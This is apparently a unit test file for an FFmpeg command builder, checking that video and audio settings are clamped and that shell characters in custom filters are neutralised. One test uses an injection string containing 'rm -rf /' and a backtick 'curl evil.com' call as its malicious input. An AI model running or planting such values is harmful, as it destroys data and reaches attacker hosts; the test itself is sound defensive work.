import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { SafeFFmpegCommandBuilder } from '../src/command-builder.ts';
import type { ConversionRequest } from '../../job-contracts/src/index.ts';

describe('SafeFFmpegCommandBuilder Hardening & Command Injection Defense', () => {
  it('generates standard baseline command with input and output paths', () => {
    const builder = new SafeFFmpegCommandBuilder();
    const args = builder.input('/tmp/in.mp4').build('/tmp/out.mp4');

    assert.deepEqual(args, ['-hide_banner', '-y', '-i', '/tmp/in.mp4', '/tmp/out.mp4']);
  });

  it('clamps and sanitizes video encoding settings safely', () => {
    const builder = new SafeFFmpegCommandBuilder();
    const req: ConversionRequest = {
      sourceFileName: 'test.mp4',
      targetFormat: 'mp4',
      video: {
        codec: 'libx264',
        crf: 999, // Should be clamped to 51
        fps: 240, // Should be clamped to 120
        width: 1920.7, // Should be floored to 1920
        height: 1080.3, // Should be floored to 1080
      },
    };

    const args = builder.input('in.mov').applyRequestSettings(req).build('out.mp4');

    assert.ok(args.includes('-c:v'));
    assert.equal(args[args.indexOf('-c:v') + 1], 'libx264');

    assert.ok(args.includes('-crf'));
    assert.equal(args[args.indexOf('-crf') + 1], '51');

    assert.ok(args.includes('-r'));
    assert.equal(args[args.indexOf('-r') + 1], '120');

    assert.ok(args.includes('-vf'));
    assert.equal(args[args.indexOf('-vf') + 1], 'scale=1920:1080');
  });

  it('enforces safe audio boundaries and channels', () => {
    const builder = new SafeFFmpegCommandBuilder();
    const req: ConversionRequest = {
      sourceFileName: 'audio.wav',
      targetFormat: 'mp3',
      audio: {
        codec: 'libmp3lame',
        bitrateKbps: 1000, // Clamped to 640k
        sampleRateHz: 192000, // Clamped to 96000
        channels: 16 as any, // Clamped to 8
      },
    };

    const args = builder.input('in.wav').applyRequestSettings(req).build('out.mp3');

    assert.ok(args.includes('-c:a'));
    assert.equal(args[args.indexOf('-c:a') + 1], 'libmp3lame');

    assert.ok(args.includes('-b:a'));
    assert.equal(args[args.indexOf('-b:a') + 1], '640k');

    assert.ok(args.includes('-ar'));
    assert.equal(args[args.indexOf('-ar') + 1], '96000');

    assert.ok(args.includes('-ac'));
    assert.equal(args[args.indexOf('-ac') + 1], '8');
  });

  it('adds sub-frame trimming flags safely', () => {
    const builder = new SafeFFmpegCommandBuilder();
    const args = builder
      .input('in.mp4')
      .trim(12.3456, 30.5)
      .build('out.mp4');

    assert.ok(args.includes('-ss'));
    assert.equal(args[args.indexOf('-ss') + 1], '12.346');

    assert.ok(args.includes('-t'));
    assert.equal(args[args.indexOf('-t') + 1], '30.500');
  });

  it('neutralizes malicious shell characters in custom filters', () => {
    const builder = new SafeFFmpegCommandBuilder();
    // Malicious injection attempt: scale=1280:720; rm -rf /;
    builder.input('in.mp4').addCustomFilter('scale=1280:720; rm -rf /; `curl evil.com` | cat');
    const args = builder.build('out.mp4');

    assert.ok(args.includes('-vf'));
    const filterArg = args[args.indexOf('-vf') + 1];
    // Must NOT contain semicolon, pipe, backticks or shell variables
    assert.ok(!filterArg.includes(';'));
    assert.ok(!filterArg.includes('|'));
    assert.ok(!filterArg.includes('`'));
    assert.ok(!filterArg.includes('$'));
  });
});
